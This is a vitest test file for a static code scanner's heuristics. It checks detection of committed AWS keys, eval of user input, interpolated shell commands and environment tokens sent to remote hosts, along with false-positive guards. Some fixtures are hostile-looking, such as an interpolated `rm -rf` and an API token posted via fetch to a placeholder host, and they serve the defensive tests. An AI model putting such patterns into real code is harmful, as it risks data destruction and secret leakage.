import { describe, expect, it } from "vitest";
import {
	hitsToFindings,
	resetHeuristicIds,
	scanLines,
} from "../../src/static/heuristics.js";

function titlesFor(source: string): string[] {
	resetHeuristicIds();
	const lines = source.split("\n");
	const hits = scanLines("a.js", lines);
	return hitsToFindings("a.js", lines, hits).map(
		(f) => `${f.severity}: ${f.title}`,
	);
}

describe("source heuristics", () => {
	it("flags a committed AWS-style access key as critical (true positive)", () => {
		const titles = titlesFor('const key = "AKIAIOSFODNN7EXAMPLE";');
		expect(
			titles.some(
				(t) => t.startsWith("critical:") && t.includes("AWS access key"),
			),
		).toBe(true);
	});

	it("ignores key-like strings in comments (false positive guard)", () => {
		const titles = titlesFor(
			"// see AKIAIOSFODNN7EXAMPLE in the AWS docs example",
		);
		expect(titles).toEqual([]);
	});

	it("flags eval() of a variable (true positive)", () => {
		const titles = titlesFor("const out = eval(userInput);");
		expect(titles.some((t) => t.includes("Dynamic code evaluation"))).toBe(
			true,
		);
	});

	it("does not flag words merely containing eval (false positive guard)", () => {
		const titles = titlesFor("const evaluation = compute(metrics);");
		expect(titles).toEqual([]);
	});

	it("flags shell commands built with interpolation (true positive)", () => {
		const titles = titlesFor("execSync(`rm -rf ${dir}`);");
		expect(titles.some((t) => t.includes("interpolated input"))).toBe(true);
	});

	it("flags interpolated commands on a child_process receiver (true positive)", () => {
		const titles = titlesFor("cp.exec(`git clone ${url}`);");
		expect(titles.some((t) => t.includes("interpolated input"))).toBe(true);
	});

	it("does not flag SQL exec on a database handle (false positive guard)", () => {
		const titles = titlesFor(
			"handle.exec(`ALTER TABLE runs ADD COLUMN ${ddl}`);",
		);
		expect(titles.some((t) => t.includes("interpolated input"))).toBe(false);
	});

	it("flags hardcoded remote URLs but not localhost (true/false positives)", () => {
		const remote = titlesFor('const u = "https://collector.example.net/x";');
		expect(remote.some((t) => t.includes("Hardcoded remote URL"))).toBe(true);
		const local = titlesFor('const u = "http://localhost:3000/x";');
		expect(local).toEqual([]);
	});

	it("flags env values flowing toward network calls in one file (true positive)", () => {
		const titles = titlesFor(
			'const token = process.env.API_TOKEN;\nawait fetch("https://x.test/", { body: token });',
		);
		expect(titles.some((t) => t.includes("Environment values flow"))).toBe(
			true,
		);
	});

	it("does not flag env reads without network calls (false positive guard)", () => {
		const titles = titlesFor(
			'const port = Number(process.env.PORT ?? "3000");',
		);
		expect(titles).toEqual([]);
	});

	it("carries file, line, and snippet evidence", () => {
		resetHeuristicIds();
		const lines = ['const key = "AKIAIOSFODNN7EXAMPLE";'];
		const hits = scanLines("src/keys.js", lines);
		const findings = hitsToFindings("src/keys.js", lines, hits);
		expect(findings.length).toBeGreaterThan(0);
		expect(findings[0]!.file).toBe("src/keys.js");
		expect(findings[0]!.evidence[0]).toContain("src/keys.js:1:");
	});
});
